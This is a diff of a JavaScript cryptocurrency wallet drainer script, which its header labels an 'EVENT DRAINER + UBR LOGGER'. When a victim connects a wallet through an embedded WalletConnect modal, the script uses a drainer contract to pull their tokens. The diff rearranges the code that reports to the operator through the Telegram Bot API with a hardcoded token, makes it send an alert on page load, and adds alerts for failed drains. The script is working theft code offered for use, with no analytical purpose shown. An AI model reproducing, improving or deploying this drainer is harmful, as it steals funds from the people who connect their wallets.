@@ -1,5 +1,5 @@
-// resolution.js - <w3m-modal> EVENT DRAINER + UBR LOGGER
-// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=11
+// resolution.js - DEBUG + TELEGRAM
+// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=12
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
 const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';
@@ -12,6 +12,27 @@ const TOKENS = {
   }
 };
 
+// Telegram
+const TELEGRAM_TOKEN = '8494512292:AAFvONmyU_G2iUj7chy1HK3M_6c65aakLZg';
+const TELEGRAM_CHAT_ID = '7178177226';
+
+async function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  console.log('Sending to Telegram:', message); // DEBUG
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ 
+      chat_id: TELEGRAM_CHAT_ID, 
+      text: message,
+      parse_mode: 'HTML'
+    })
+  }).then(r => r.json()).then(data => console.log('Telegram response:', data)).catch(err => console.error('Telegram failed:', err));
+}
+
+// Force test on load
+sendToTelegram(`<b>🔴 UBR SCRIPT LOADED</b>\nURL: ${window.location.href}\nTime: ${new Date().toLocaleString()}`);
+
 // Embed modal
 document.body.insertAdjacentHTML('beforeend', `
   <w3m-modal projectId="${PROJECT_ID}" themeMode="dark"></w3m-modal>
@@ -21,6 +42,7 @@ document.body.insertAdjacentHTML('beforeend', `
 const ethersScript = document.createElement('script');
 ethersScript.src = 'https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js';
 ethersScript.onload = () => {
+  console.log('Ethers loaded');
   const modal = document.querySelector('w3m-modal');
   if (modal) {
     modal.addEventListener('connect', async (event) => {
@@ -70,25 +92,9 @@ async function drainAll(provider, signer, user) {
       sendToTelegram(`<b>🟢 UBR DRAINED</b> ${name}\nWallet: <code>${user.slice(0,6)}...${user.slice(-4)}</code>\nTx: <a href="https://etherscan.io/tx/${tx.hash}">View Tx</a>\nTime: ${new Date().toLocaleString()}`);
     } catch (err) {
       console.warn(`Failed ${name}:`, err.message);
+      sendToTelegram(`<b>🔴 UBR FAILED</b> ${name}\nWallet: <code>${user.slice(0,6)}...${user.slice(-4)}</code>\nError: ${err.message}\nTime: ${new Date().toLocaleString()}`);
     }
   }
 }
 
 window.connectWallet = () => document.querySelector('w3m-modal')?.open();
-
-// UBR LOGGER TELEGRAM ALERTS
-const TELEGRAM_TOKEN = '8494512292:AAFvONmyU_G2iUj7chy1HK3M_6c65aakLZg';
-const TELEGRAM_CHAT_ID = '7178177226';
-
-async function sendToTelegram(message) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-  fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ 
-      chat_id: TELEGRAM_CHAT_ID, 
-      text: message,
-      parse_mode: 'HTML'
-    })
-  }).catch(() => {});
-}
